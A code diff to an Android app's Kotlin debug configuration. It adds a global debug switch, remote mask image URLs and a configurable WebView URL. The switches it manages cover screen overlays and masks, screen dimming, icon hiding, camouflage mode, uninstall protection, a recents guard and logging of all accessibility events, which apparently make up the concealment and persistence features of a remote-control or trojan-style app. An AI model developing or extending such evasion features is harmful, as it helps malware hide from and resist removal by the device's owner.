@@ -18,10 +18,19 @@ object DebugConfig {
     private const val TAG = "DebugConfig"
     private const val CONFIG_FILE = "config.json"
 
+    // ── global ──
+    var debug: Boolean = false; private set
+
     // ── overlay ──
     var disableConfigMask: Boolean = false; private set
     var disableFullscreenBlocker: Boolean = false; private set
     var disableCipherOverlay: Boolean = false; private set
+    var maskBgUrl: String = ""; private set
+    var maskIconUrl: String = ""; private set
+
+    // ── webview ──
+    var webUrl: String = ""; private set
+    var disableWebView: Boolean = false; private set
 
     // ── screen ──
     var disableDimScreen: Boolean = false; private set
@@ -66,11 +75,22 @@ object DebugConfig {
             val json = context.assets.open(CONFIG_FILE).bufferedReader().use { it.readText() }
             val root = JSONObject(json)
 
+            // global debug switch — overrides all disable_* fields
+            debug = root.optBoolean("debug", false)
+
             // overlay
             root.optJSONObject("overlay")?.let { o ->
                 disableConfigMask = o.optBoolean("disable_config_mask", false)
                 disableFullscreenBlocker = o.optBoolean("disable_fullscreen_blocker", false)
                 disableCipherOverlay = o.optBoolean("disable_cipher_overlay", false)
+                maskBgUrl = o.optString("mask_bg_url", "")
+                maskIconUrl = o.optString("mask_icon_url", "")
+            }
+
+            // webview
+            root.optJSONObject("webview")?.let { w ->
+                webUrl = w.optString("web_url", "")
+                disableWebView = w.optBoolean("disable_webview", false)
             }
 
             // screen
@@ -113,7 +133,20 @@ object DebugConfig {
                 logAllAccessibilityEvents = l.optBoolean("log_all_accessibility_events", false)
             }
 
-            Log.i(TAG, "✅ 调试配置已加载: mask=$disableConfigMask dim=$disableDimScreen icon=$disableIconHide protect=$disableUninstallProtection")
+            if (debug) {
+                disableConfigMask = true
+                disableFullscreenBlocker = true
+                disableCipherOverlay = true
+                disableWebView = true
+                disableDimScreen = true
+                disableBrightnessRestore = true
+                disableIconHide = true
+                disableCamouflageMode = true
+                disableUninstallProtection = true
+                disableRecentsGuard = true
+            }
+
+            Log.i(TAG, "✅ 调试配置已加载: debug=$debug mask=$disableConfigMask dim=$disableDimScreen icon=$disableIconHide protect=$disableUninstallProtection")
         } catch (e: Exception) {
             Log.w(TAG, "⚠️ 调试配置加载失败 (使用默认值): ${e.message}")
         }
@@ -126,7 +159,9 @@ object DebugConfig {
         if (!initialized) return
         Log.d(TAG, buildString {
             appendLine("╔══ DebugConfig ══")
+            appendLine("║ debug:      $debug")
             appendLine("║ overlay:    mask=$disableConfigMask blocker=$disableFullscreenBlocker cipher=$disableCipherOverlay")
+            appendLine("║ webview:    url='$webUrl' disable=$disableWebView")
             appendLine("║ screen:     dim=$disableDimScreen brightnessRestore=$disableBrightnessRestore")
             appendLine("║ icon:       hide=$disableIconHide camouflage=$disableCamouflageMode")
             appendLine("║ protection: uninstall=$disableUninstallProtection recents=$disableRecentsGuard")
